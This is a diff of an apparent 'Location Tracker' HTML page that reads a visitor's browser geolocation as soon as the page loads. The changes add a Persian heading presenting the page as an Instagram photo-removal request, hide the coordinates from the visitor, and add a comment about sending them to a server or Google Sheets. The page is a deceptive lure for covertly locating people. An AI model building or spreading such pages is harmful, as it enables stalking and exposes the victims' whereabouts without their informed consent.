@@ -1,11 +1,10 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
     <script>
-        // Function to get the current location
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -14,15 +13,15 @@
             }
         }
 
-        // Function to show position when location is found
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
             document.getElementById("status").innerHTML = "instagram.com/"+latitude+"-"+longitude;
-            document.getElementById("location").innerHTML = "instagram.com/"+latitude+"-"+longitude;
+            
+            // You can send the location data to a server or Google Sheets here
+            // Example: Using an AJAX call to send the location to a Google Sheets script or a database
         }
 
-        // Function to handle errors if location cannot be retrieved
         function showError(error) {
             switch(error.code) {
                 case error.PERMISSION_DENIED:
@@ -40,26 +39,15 @@
             }
         }
 
-        // Trigger the location check on page load
         window.onload = getLocation;
-
-        // Function to refresh location when button is clicked
-        function refreshLocation() {
-            getLocation();
-        }
     </script>
 </head>
 <body>
-    <h2>Click the link to save your location</h2>
-    <p id="status">نمایش تصویر...</p>
+    <h2>درخواست حذف تصویر از اینستاگرام</h2>
+    <p id="status">Tracking location...</p>
     
-    <!-- This is where the location info will appear -->
-    <p id="location"></p>
-
-    <!-- Button to refresh location -->
-    <button onclick="refreshLocation()">حذف</button>
     <!-- Image you uploaded -->
-    <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="300">
+    <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
 
 </body>
 </html>
